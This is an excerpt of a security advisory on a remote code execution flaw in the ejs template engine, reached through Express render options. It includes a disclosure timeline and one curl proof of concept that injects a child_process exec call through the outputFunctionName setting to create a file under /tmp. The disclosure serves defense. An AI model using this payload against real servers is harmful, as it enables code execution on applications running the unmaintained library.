<header class="post-header d-block mb-6">
      ...
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-021: Remote code execution in ejs</h1>
...
<ul>
  <li>25/01/2021: Report sent to Vendor</li>
  <li>01/02/2021: Project has been declared dead by its maintainers</li>
</ul>
...
<p><code class="language-plaintext highlighter-rouge">ejs</code> mixes pure template data with engine configuration options through the Express render API. By overwriting internal configuration options remote code execution may be triggered in downstream applications.</p>
...
<p>The following proof of concept should create a file via touch named /tmp/GHSLPayload:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s1">'http://localhost:3000/?message=foo&amp;settings\[view%20options\]\[outputFunctionName\]=x%3Bprocess.mainModule.require(%27child_process%27).exec(%27bash%20-c%20%22touch%20%2Ftmp%2FGHSLPayload%22%27)%3Bx'</span>
</code></pre></div></div>
...
<ul>
  ...
  <li>https://github.com/tj/ejs/issues/256</li>
</ul>
...
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-021</code> in any communication regarding this issue.</p>
